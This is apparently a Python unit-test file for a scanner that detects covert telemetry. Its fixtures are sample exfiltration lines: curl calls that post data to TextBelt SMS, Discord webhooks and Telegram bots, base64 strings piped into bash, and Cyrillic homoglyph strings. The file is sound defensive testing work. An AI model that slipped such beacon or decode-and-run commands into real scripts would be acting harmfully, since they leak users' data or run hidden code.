#!/usr/bin/env python3
"""Unit tests for scan_covert_telemetry.py.

Verifies deterministic detection of:
1. Base64 shell pipelines (base64 -d | bash)
2. SMS exfiltration endpoints (TextBelt, Twilio)
3. Webhook exfiltration endpoints (Discord, Telegram, Slack)
4. Cyrillic homoglyphs in payload strings
5. Embedded Base64 exfiltration payload decoding
6. Clean files (zero false positives)
"""

import json
import os
from pathlib import Path
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scan_covert_telemetry import (
    scan_file,
    scan_target,
    try_decode_base64_payload,
    inspect_homoglyphs,
    CovertTelemetryFinding
)

class TestScanCovertTelemetry(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.TemporaryDirectory()
        self.target_dir = Path(self.test_dir.name)

    def tearDown(self):
        self.test_dir.cleanup()

    def test_detect_base64_shell_pipeline(self):
        code = 'echo "Y2xlYXIgJiYgbHMgLWxhCg==" | base64 -d | bash\n'
        test_file = self.target_dir / "pipeline.sh"
        test_file.write_text(code, encoding="utf-8")

        findings = scan_file(test_file, "pipeline.sh")
        self.assertTrue(any(f.rule_id == "OBFUSCATED_BASE64_SHELL_PIPE" for f in findings))
        matching = [f for f in findings if f.rule_id == "OBFUSCATED_BASE64_SHELL_PIPE"][0]
        self.assertEqual(matching.severity, "CRITICAL")
        self.assertEqual(matching.cwe, "CWE-1027")
        self.assertEqual(matching.vuln_id, "VULN-CRYP-005")

    def test_detect_textbelt_sms_beacon(self):
        code = "curl -X POST https://textbelt.com/text --data-urlencode phone='+123456789' -d key=textbelt\n"
        test_file = self.target_dir / "beacon.sh"
        test_file.write_text(code, encoding="utf-8")

        findings = scan_file(test_file, "beacon.sh")
        self.assertTrue(any(f.rule_id == "TEXTBELT_SMS_BEACON" for f in findings))
        matching = [f for f in findings if f.rule_id == "TEXTBELT_SMS_BEACON"][0]
        self.assertEqual(matching.severity, "CRITICAL")
        self.assertEqual(matching.cwe, "CWE-359")

    def test_detect_discord_webhook(self):
        code = 'curl -H "Content-Type: application/json" -d "{\\"content\\":\\"leaked\\"}" https://discord.com/api/webhooks/1234567890/tokenABC_123-xyz\n'
        test_file = self.target_dir / "discord.sh"
        test_file.write_text(code, encoding="utf-8")

        findings = scan_file(test_file, "discord.sh")
        self.assertTrue(any(f.rule_id == "DISCORD_WEBHOOK_EXFILTRATION" for f in findings))

    def test_detect_telegram_bot_beacon(self):
        code = 'curl -s -X POST https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage -d chat_id=123 -d text=test\n'
        test_file = self.target_dir / "telegram.sh"
        test_file.write_text(code, encoding="utf-8")

        findings = scan_file(test_file, "telegram.sh")
        self.assertTrue(any(f.rule_id == "TELEGRAM_BOT_EXFILTRATION" for f in findings))

    def test_detect_cyrillic_homoglyphs(self):
        # 'A' and 'o' written with Cyrillic characters: \u0410 (A), \u043e (o) mixed with Latin
        cyrillic_line = 'echo "$user Download \u0410ll\u043ek\u0456ng"\n'
        test_file = self.target_dir / "homoglyph.sh"
        test_file.write_text(cyrillic_line, encoding="utf-8")

        findings = scan_file(test_file, "homoglyph.sh")
        self.assertTrue(any(f.rule_id == "HOMOGLYPH_OBFUSCATED_STRING" for f in findings))

    def test_detect_embedded_base64_beacon(self):
        # Base64 payload encoding: curl -X POST https://textbelt.com/text --data phone=123
        raw_cmd = "curl -X POST https://textbelt.com/text --data phone=123"
        import base64
        b64_str = base64.b64encode(raw_cmd.encode("utf-8")).decode("utf-8")
        code = f'echo {b64_str} | base64 -d | bash\n'
        test_file = self.target_dir / "embedded.sh"
        test_file.write_text(code, encoding="utf-8")

        findings = scan_file(test_file, "embedded.sh")
        self.assertTrue(any(f.rule_id == "EMBEDDED_BASE64_EXFILTRATION_BEACON" for f in findings))
        embedded_match = [f for f in findings if f.rule_id == "EMBEDDED_BASE64_EXFILTRATION_BEACON"][0]
        self.assertIn("textbelt.com", embedded_match.decoded_payload)

    def test_clean_file_no_findings(self):
        code = """
        import os
        import sys

        def clean_function():
            print("Hello safe world")
            return 42
        """
        test_file = self.target_dir / "clean.py"
        test_file.write_text(code, encoding="utf-8")

        findings = scan_file(test_file, "clean.py")
        self.assertEqual(len(findings), 0)

    def test_finding_contract_structure(self):
        finding = CovertTelemetryFinding(
            rule_id="TEXTBELT_SMS_BEACON",
            title="Test finding",
            severity="CRITICAL",
            cwe="CWE-359",
            vuln_id="VULN-CRYP-005",
            file_path="src/beacon.sh",
            line_number=10,
            line_content="curl https://textbelt.com/text",
            recommendation="Remove"
        )
        d = finding.to_dict()
        self.assertTrue(d["fingerprint"].startswith("devia/v1:sha256:"))
        self.assertEqual(d["dimension"], "SECRETS_CRYPTOGRAPHY")
        self.assertEqual(d["location"]["line"], 10)


if __name__ == "__main__":
    unittest.main()
